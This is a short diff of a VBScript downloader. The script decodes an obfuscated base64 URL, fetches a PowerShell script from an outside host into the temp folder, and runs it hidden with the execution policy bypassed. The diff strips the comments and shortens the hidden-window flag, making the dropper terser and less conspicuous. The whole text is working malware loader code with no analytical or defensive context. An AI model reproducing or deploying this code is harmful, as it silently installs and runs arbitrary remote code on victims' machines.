@@ -4,7 +4,7 @@ Set stream = CreateObject("ADODB.Stream")
 
 b64url = "aHR0cHM6Ly8zLTRweC5wYWdlcy5kZXYvQS5wczE="
 url = shell.Exec("powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & b64url & "'))").StdOut.ReadAll
-url = Trim(url) ' Удаляем лишние пробелы/переводы строки
+url = Trim(url)
 dest = shell.ExpandEnvironmentStrings("%TEMP%\A.ps1")
 
 On Error Resume Next
@@ -13,10 +13,10 @@ http.Open "GET", url, False
 http.Send
 
 If http.Status = 200 Then
-    stream.Type = 1 'binary
+    stream.Type = 1
     stream.Open
     stream.Write http.ResponseBody
     stream.SaveToFile dest, 2
     stream.Close
-    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & dest & """", 0, False
+    shell.Run "powershell -ExecutionPolicy Bypass -w h -File """ & dest & """", 0, False
 End If
